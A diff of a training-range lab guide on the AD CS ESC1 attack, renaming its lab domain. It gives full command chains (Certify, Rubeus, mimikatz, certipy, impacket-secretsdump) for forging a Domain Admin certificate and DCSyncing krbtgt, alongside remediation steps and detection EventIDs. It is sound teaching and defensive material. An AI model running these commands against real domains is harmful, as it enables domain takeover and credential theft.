@@ -1,10 +1,10 @@
 # AP05 — AD CS ESC1 (Enrollee-Supplies-Subject) on a hybrid DC
 
 **Layer:** Hybrid — AD DS + AD CS on-prem over Azure IaaS (`hybrid-ad` module)  
-**Cost:** the **most expensive** AP in the range — the only **always-on Windows** VM. `Standard_B2ms` ~EUR 0.083/h (~EUR 60/month 24x7) or `Standard_B2s` as the floor (~EUR 0.041/h, ~EUR 30/month); a 127 GiB StandardSSD disk ~EUR 8-10/month; a Standard public IP ~EUR 3-4/month; Log Analytics ingestion (5 filtered EventIDs, ~0.1-0.3 GB/day) a few EUR/month. With daily **auto-shutdown** (2200) and ~8 h/day usage it drops to ~1/3 → roughly **~EUR 20-40/month**; `./azrange.ps1 destroy` takes it to 0. (West Europe, pay-as-you-go; a **Windows** VM rate includes the OS license, so Linux price lists understate it — treat these as rough figures and confirm with the Azure Pricing Calculator.)  
+**Cost:** the **most expensive** AP in the range — the only **always-on Windows** VM. `Standard_B2ms` ~EUR 0.083/h (~EUR 60/month 24x7) or `Standard_B2s` as the floor (~EUR 0.041/h, ~EUR 30/month); a 127 GiB StandardSSD disk ~EUR 8-10/month; a Standard public IP ~EUR 3-4/month; Log Analytics ingestion (5 filtered EventIDs, ~0.1-0.3 GB/day) a few EUR/month. With daily **auto-shutdown** (2200) and ~8 h/day usage it drops to ~1/3 → roughly **~EUR 20-40/month**; `./aether.ps1 destroy` takes it to 0. (West Europe, pay-as-you-go; a **Windows** VM rate includes the OS license, so Linux price lists understate it — treat these as rough figures and confirm with the Azure Pricing Calculator.)  
 **MITRE ATT&CK:** [T1649](https://attack.mitre.org/techniques/T1649/) (Steal or Forge Authentication Certificates — *core: AD CS*) · [T1550](https://attack.mitre.org/techniques/T1550/) (Use Alternate Authentication Material — *Pass-the-Certificate* via PKINIT) · [T1003.006](https://attack.mitre.org/techniques/T1003/006/) (OS Credential Dumping: DCSync)  
 **Maps to cert:** CRTO / CRTE (AD CS abuse + Kerberos PKINIT + DCSync; adjacent defensive side: SC-200 / Microsoft Defender for Identity)  
-**Precondition seeded by the range:** the `azrange.lab` forest + Enterprise Root CA `azrange-CA`, both on a single Windows Server 2022 VM; a **low-privilege** user `ap05user` (UPN `ap05user@azrange.lab`, member of `Domain Users` only); and the **vulnerable** certificate template `AzRangeAuthESC1`, seeded by `scripts/seed-ap05.ps1` via `az vm run-command` during `deploy` (exact symmetry with `seed-ap01.ps1`). CA and Kerberos auditing (essential for the 🔵 layer) is enabled by the **DSC baseline**, not the seed. **What is NOT seeded:** any Domain Admin credential — the DA is **compromised by forging the certificate**.
+**Precondition seeded by the range:** the `aether.lab` forest + Enterprise Root CA `aether-CA`, both on a single Windows Server 2022 VM; a **low-privilege** user `ap05user` (UPN `ap05user@aether.lab`, member of `Domain Users` only); and the **vulnerable** certificate template `AetherAuthESC1`, seeded by `scripts/seed-ap05.ps1` via `az vm run-command` during `deploy` (exact symmetry with `seed-ap01.ps1`). CA and Kerberos auditing (essential for the 🔵 layer) is enabled by the **DSC baseline**, not the seed. **What is NOT seeded:** any Domain Admin credential — the DA is **compromised by forging the certificate**.
 
 ---
 
@@ -14,7 +14,7 @@ For the student to internalize that **a misconfigured certificate template is a 
 
 The conceptual axis is a single *load-bearing* attribute: `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (`0x1`) in `msPKI-Certificate-Name-Flag`. That bit — and only that bit — lets the requester dictate the identity the certificate will authenticate. Combined with an authentication EKU, enrollment rights for low-privilege principals, no manager approval, and no RA signatures, the chain is deterministic.
 
-The **five conditions of ESC1** (all simultaneous) that the range seeds into `AzRangeAuthESC1` — the map of the exploit and, mirrored, that of the remediation:
+The **five conditions of ESC1** (all simultaneous) that the range seeds into `AetherAuthESC1` — the map of the exploit and, mirrored, that of the remediation:
 
 1. **Low-privilege enroll (C1):** `Domain Users` has the Certificate-Enrollment *extended right* (`0e10c968-78fb-11d2-90d4-00c04f79dc55`) in the `nTSecurityDescriptor` → `ap05user` inherits Enroll.
 2. **No manager approval (C2):** `msPKI-Enrollment-Flag` **without** `CT_FLAG_PEND_ALL_REQUESTS` (`0x2`).
@@ -30,7 +30,7 @@ Break **any** of the five and ESC1 dies: that is why the 🟢 section offers sev
 
 ## 🔴 Exploit (how it is exploited)
 
-> Authorized training lab, your own test tenant/subscription. The `azrange.lab` forest is isolated and does **not** sync with any tenant (that would be AP06). Every step starts from `ap05user` (low privilege); the Domain Admin is not known in advance.
+> Authorized training lab, your own test tenant/subscription. The `aether.lab` forest is isolated and does **not** sync with any tenant (that would be AP06). Every step starts from `ap05user` (low privilege); the Domain Admin is not known in advance.
 
 The canonical chain is `ESC1 enrollment → cert with SAN = a DA's UPN → PKINIT → DA's TGT → DCSync`. The range provides **two routes** depending on the network posture the operator chooses.
 
@@ -39,14 +39,14 @@ The canonical chain is `ESC1 enrollment → cert with SAN = a DA's UPN → PKINI
 The module's NSG does **not** open LDAP/Kerberos/RPC to the Internet. The intended path is RDP to the DC (from `admin_source_cidr`) and running the Windows-native tools **as `ap05user`**. Reference: **Certify.exe** + **Rubeus.exe** + **mimikatz** (GhostPack).
 
 ```powershell
-# RDP to <ap05_dc_public_ip> as AZRANGE\ap05user (source = admin_source_cidr)
+# RDP to <ap05_dc_public_ip> as AETHER\ap05user (source = admin_source_cidr)
 
 # 1. Enumerate vulnerable templates (ESC1)
 .\Certify.exe find /vulnerable
-#   → AzRangeAuthESC1: ENROLLEE_SUPPLIES_SUBJECT + Client Authentication + Enroll for Domain Users
+#   → AetherAuthESC1: ENROLLEE_SUPPLIES_SUBJECT + Client Authentication + Enroll for Domain Users
 
 # 2. Request the cert, setting SAN = a Domain Admin's UPN
-.\Certify.exe request /ca:dc.azrange.lab\azrange-CA /template:AzRangeAuthESC1 /altname:administrator
+.\Certify.exe request /ca:dc.aether.lab\aether-CA /template:AetherAuthESC1 /altname:administrator
 #   → copy the PEM block (private key + cert) to cert.pem
 
 # 3. PEM → PFX (Rubeus consumes PFX)
@@ -57,7 +57,7 @@ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provid
 .\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:<pfxpass> /ptt
 
 # 5. DCSync krbtgt (or /all) with the already-injected TGT
-.\mimikatz.exe "lsadump::dcsync /domain:azrange.lab /user:krbtgt" exit
+.\mimikatz.exe "lsadump::dcsync /domain:aether.lab /user:krbtgt" exit
 ```
 
 ### Route B — remote certipy (only if the operator opened the AD ports to `admin_source_cidr`)
@@ -66,14 +66,14 @@ If the operator relaxes the NSG to expose LDAP/Kerberos/RPC to their `/32`, the 
 
 ```bash
 # 1. Enumerate vulnerable templates as the low-privilege user
-certipy find -u 'ap05user@azrange.lab' -p '<ap05user_pass>' \
+certipy find -u 'ap05user@aether.lab' -p '<ap05user_pass>' \
   -dc-ip <ap05_dc_public_ip> -vulnerable -stdout
-#   → flags AzRangeAuthESC1 as ESC1
+#   → flags AetherAuthESC1 as ESC1
 
 # 2. Request the cert with SAN = a Domain Admin's UPN
-certipy req -u 'ap05user@azrange.lab' -p '<ap05user_pass>' \
-  -dc-ip <ap05_dc_public_ip> -ca 'azrange-CA' \
-  -template 'AzRangeAuthESC1' -upn 'administrator@azrange.lab'
+certipy req -u 'ap05user@aether.lab' -p '<ap05user_pass>' \
+  -dc-ip <ap05_dc_public_ip> -ca 'aether-CA' \
+  -template 'AetherAuthESC1' -upn 'administrator@aether.lab'
 #   → administrator.pfx
 
 # 3. PKINIT with the forged cert → TGT + (UnPAC-the-hash) the DA's NT hash
@@ -82,14 +82,14 @@ certipy auth -pfx 'administrator.pfx' -dc-ip <ap05_dc_public_ip>
 
 # 4. DCSync as Domain Admin (ticket or hash)
 KRB5CCNAME=administrator.ccache impacket-secretsdump -k -no-pass \
-  'azrange.lab/administrator@dc.azrange.lab' -just-dc-user 'AZRANGE/krbtgt'
+  'aether.lab/administrator@dc.aether.lab' -just-dc-user 'AETHER/krbtgt'
 #   alternative with the recovered hash:
-#   impacket-secretsdump -hashes :<nt_hash> 'azrange.lab/administrator@<ap05_dc_public_ip>'
+#   impacket-secretsdump -hashes :<nt_hash> 'aether.lab/administrator@<ap05_dc_public_ip>'
 ```
 
-Graph-based discovery: **Certipy** flags the template as vulnerable directly; **BloodHound** (collector with AD CS support / `Certipy ... -bloodhound`) draws the enrollment edge from `ap05user` onto `AzRangeAuthESC1` and its path to Domain Admin.
+Graph-based discovery: **Certipy** flags the template as vulnerable directly; **BloodHound** (collector with AD CS support / `Certipy ... -bloodhound`) draws the enrollment edge from `ap05user` onto `AetherAuthESC1` and its path to Domain Admin.
 
-> **Caveat — the SAN is set by the requester, not the template.** `AzRangeAuthESC1` does not "contain" administrator: the `ENROLLEE_SUPPLIES_SUBJECT` bit lets `-altname`/`-upn` inject it at request time. That is why pure ESC1 does **not** need `EDITF_ATTRIBUTESUBJECTALTNAME2` on the CA (that would be ESC6, a different and noisier route).
+> **Caveat — the SAN is set by the requester, not the template.** `AetherAuthESC1` does not "contain" administrator: the `ENROLLEE_SUPPLIES_SUBJECT` bit lets `-altname`/`-upn` inject it at request time. That is why pure ESC1 does **not** need `EDITF_ATTRIBUTESUBJECTALTNAME2` on the CA (that would be ESC6, a different and noisier route).
 
 > **Caveat — KB5014754 / strong mapping.** The lab runs with `StrongCertificateBindingEnforcement = 1` (Compatibility) **on purpose**, so the KDC accepts the implicit UPN mapping and the forged PKINIT works. Under **Full Enforcement** (value `2`, or the default after the **September 9, 2025** security update) the KDC validates the certificate's SID extension (`szOID_NTDS_CA_SECURITY_EXT`, which carries the **requester's** SID `ap05user`, not the SAN's `administrator`) and **denies** the logon → the 🔴 chain fails and the lab *appears* "already patched." Recent certipy can embed a forged SID (`-sid`), but under Full Enforcement the forge still fails because the SID does not match the authenticated account. This **is** the real platform fix (see 🟢).
 
@@ -111,7 +111,7 @@ Each of these actions **cuts ESC1 independently** (breaks one of the five condit
 
 3. **Restrict the Enroll ACL (C1).** Remove the Certificate-Enrollment *extended right* from `Domain Users` / `Authenticated Users` and leave it only on explicit, audited principals. An authentication template should **never** be enrollable by the whole domain.
 
-4. **Unpublish the template.** `certutil -SetCATemplates -AzRangeAuthESC1` (or *Certification Authority* → *Certificate Templates* → *Delete*). It removes the template from the *Enrollment Services* `certificateTemplates` → it stops being **requestable** even though the object still exists.
+4. **Unpublish the template.** `certutil -SetCATemplates -AetherAuthESC1` (or *Certification Authority* → *Certificate Templates* → *Delete*). It removes the template from the *Enrollment Services* `certificateTemplates` → it stops being **requestable** even though the object still exists.
 
 5. **CA hygiene — `EDITF_ATTRIBUTESUBJECTALTNAME2` (defense in depth, cuts ESC6).** Not required to neutralize pure ESC1, but a CA with this flag allows arbitrary SANs to be injected **in any** template: disable it.
    ```powershell
@@ -133,11 +133,11 @@ az vm run-command invoke \
   --command-id RunPowerShellScript \
   --scripts @scripts/seed-ap05.ps1 \
   --parameters Remediate=true EaPassword='<dc_admin_password>' \
-               DomainFqdn=azrange.lab DomainNetbios=AZRANGE \
-               TemplateName=AzRangeAuthESC1 CaCommonName=azrange-CA
+               DomainFqdn=aether.lab DomainNetbios=AETHER \
+               TemplateName=AetherAuthESC1 CaCommonName=aether-CA
 ```
 
-> **Two reset levels — do not confuse them.** (1) **Hard / cost→0:** `./azrange.ps1 reset` re-applies with `enable_ap05 = false` (`count = 0`) → Terraform **destroys the entire VM** and, with it, atomically, the `AzRangeAuthESC1` template, the forged/issued certificates, and the CA DB. It is a reset with no *out-of-state* residue (tied with AP07 as the cleanest in the range): unlike AP02/AP03/AP04 (where the attacker's actions land *outside* Terraform state and must be cleaned up by hand), here the entire vulnerable surface lives on a disposable VM → zero *out-of-state* residue, zero subsequent cost. (2) **In-place / pedagogical:** `seed-ap05.ps1 -Remediate` (above). `./azrange.ps1 reset` does **not** pre-remediate AP05 via `run-command` (a deliberate divergence from AP01: the vuln lives on the destroyable VM, which may also be *deallocated* by auto-shutdown and would make the `run-command` fail). The template is **not** an `azurerm` resource (Terraform does not manage AD CS templates: they are objects in the DC's *Configuration NC*) — that very property is what yields the clean reset. On a **live** DC, `enable_ap05=false` destroys the VM (and the template), but does **not** "fix" a running DC until you re-apply/destroy; that is what `-Remediate` is for.
+> **Two reset levels — do not confuse them.** (1) **Hard / cost→0:** `./aether.ps1 reset` re-applies with `enable_ap05 = false` (`count = 0`) → Terraform **destroys the entire VM** and, with it, atomically, the `AetherAuthESC1` template, the forged/issued certificates, and the CA DB. It is a reset with no *out-of-state* residue (tied with AP07 as the cleanest in the range): unlike AP02/AP03/AP04 (where the attacker's actions land *outside* Terraform state and must be cleaned up by hand), here the entire vulnerable surface lives on a disposable VM → zero *out-of-state* residue, zero subsequent cost. (2) **In-place / pedagogical:** `seed-ap05.ps1 -Remediate` (above). `./aether.ps1 reset` does **not** pre-remediate AP05 via `run-command` (a deliberate divergence from AP01: the vuln lives on the destroyable VM, which may also be *deallocated* by auto-shutdown and would make the `run-command` fail). The template is **not** an `azurerm` resource (Terraform does not manage AD CS templates: they are objects in the DC's *Configuration NC*) — that very property is what yields the clean reset. On a **live** DC, `enable_ap05=false` destroys the VM (and the template), but does **not** "fix" a running DC until you re-apply/destroy; that is what `-Remediate` is for.
 
 ---
 
@@ -152,8 +152,8 @@ The source is **Windows Security events** from the DC/CA (on-prem — there are 
 
 | Signal | EventID | What to look at |
 |---|---|---|
-| Certificate request to the CA | `4886` | `CertificateTemplate == AzRangeAuthESC1`; *requester* = `ap05user` |
-| **Issuance** of the certificate by the CA | `4887` | `CertificateTemplate == AzRangeAuthESC1` — *honeytemplate*: **any** issuance is suspicious in itself |
+| Certificate request to the CA | `4886` | `CertificateTemplate == AetherAuthESC1`; *requester* = `ap05user` |
+| **Issuance** of the certificate by the CA | `4887` | `CertificateTemplate == AetherAuthESC1` — *honeytemplate*: **any** issuance is suspicious in itself |
 | Certificate-services template / security change | `4899` / `4900` | the **seeding** itself or tampering with the template (the defender *watches the vuln being planted*) |
 | Kerberos TGT via **PKINIT** | `4768` | *Certificate Information* populated (`CertThumbprint`/`CertSerialNumber` non-empty, `PreAuthType = 16`); account = `administrator` |
 | (Complementary, *System* channel, post-KB5014754) | `Kerberos-Key-Distribution-Center 39/41` | requester SID ≠ subject SID → weak mapping/rejection |
